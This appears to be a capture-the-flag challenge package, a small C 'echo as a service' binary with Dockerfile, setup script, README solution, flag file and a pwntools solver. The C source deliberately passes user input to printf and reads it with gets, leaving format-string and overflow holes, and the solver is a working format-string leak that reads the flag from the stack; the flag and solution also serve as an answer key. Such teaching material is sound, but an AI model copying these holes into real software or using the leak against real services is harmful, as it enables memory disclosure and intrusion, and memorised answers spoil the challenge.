{
    "Dockerfile": "FROM ubuntu:latest\n\nenv DEBIAN_FRONTEND=\"noninteractive\"\n\n\nRUN apt-get update && apt-get install socat -y\n\nRUN groupadd ctf\n\n\nRUN mkdir /pwn\n\nCOPY echoasaservice /pwn/echoasaservice\nCOPY flag.txt /pwn/flag.txt\nCOPY start.sh /pwn/start.sh\n\nRUN useradd -G ctf --home=/pwn pwnuser\n\nRUN chown -R pwnuser /pwn\nRUN chmod -R 555 /pwn\n\nEXPOSE 4251\n\nENTRYPOINT [\"/pwn/start.sh\"]\n",
    "echoasaservice": "[Binary file or unsupported type: c:\\users\\jomue\\tamuctf-2020-master\\tamuctf-2020-master\\pwn\\echoasaservice\\echoasaservice]",
    "echoasaservice.c": "#include \"unistd.h\"\n#include \"stdio.h\"\n#include \"stdlib.h\"\n\n\nint main() {\n    setvbuf(stdout,_IONBF,0,0);\n\n\n\tFILE* flagfile = fopen(\"flag.txt\",\"r\");\n\tchar flag[24];\n\tif(flagfile != NULL) {\n\t\tfgets(flag, 25, flagfile);\n\t}\n\twhile(1) {\n\t\tprintf(\"Echo as a service (EaaS)\\n\");\n\t\tchar input[24];\n\t\tgets(input);\n\t\tprintf(input);\n\t\tprintf(\"\\n\");\n\t}\n}\n",
    "flag.txt": "gigem{3asy_f0rmat_vuln1}\n",
    "README.md": "## Description\n\nEcho as a service (EaaS) is going to be the newest hot startup!  We've tapped a big market: Developers who really like SaaS.    \n\n## Documentation\n\nBasic string formatting pwn challenge.  \n\n### Setup\n\n1. docker build . -t eaas\n2. docker run --rm -it -p 4251:4251 eaas\n\n## Solution\n\nLook through the disassembled main function to figure out where its putting the data it reads and then grab that memory with sufficient %x.  I've attached a solver.   \n",
    "solver.py": "from pwn import *\n\ncontext.terminal = ['termite', '-e']\n\n#p = gdb.debug('./easy_string_format', gdbscript='b *main+125\\nc')\np = process('./echoasaservice')\np.recvline()\npayload = bytearray()\npayload += \"%8$lx.%9$lx.%10$lx\".encode()\np.sendline(payload)\nflag = p.recvline().decode('utf-8').rstrip()\nsplit = flag.split('.')\nendian = \"\".join([\"\".join(reversed([j[i:i+2] for i in range(0, len(j), 2)])) for j in split])\nprint(bytearray.fromhex(endian).decode())\n",
    "start.sh": "#!/bin/bash\n\nwhile : \ndo\n    su -c \"exec socat TCP-LISTEN:4251,reuseaddr,fork EXEC:/pwn/echoasaservice,stderr\" - pwnuser;\ndone\n",
    "category": "Pwn"
}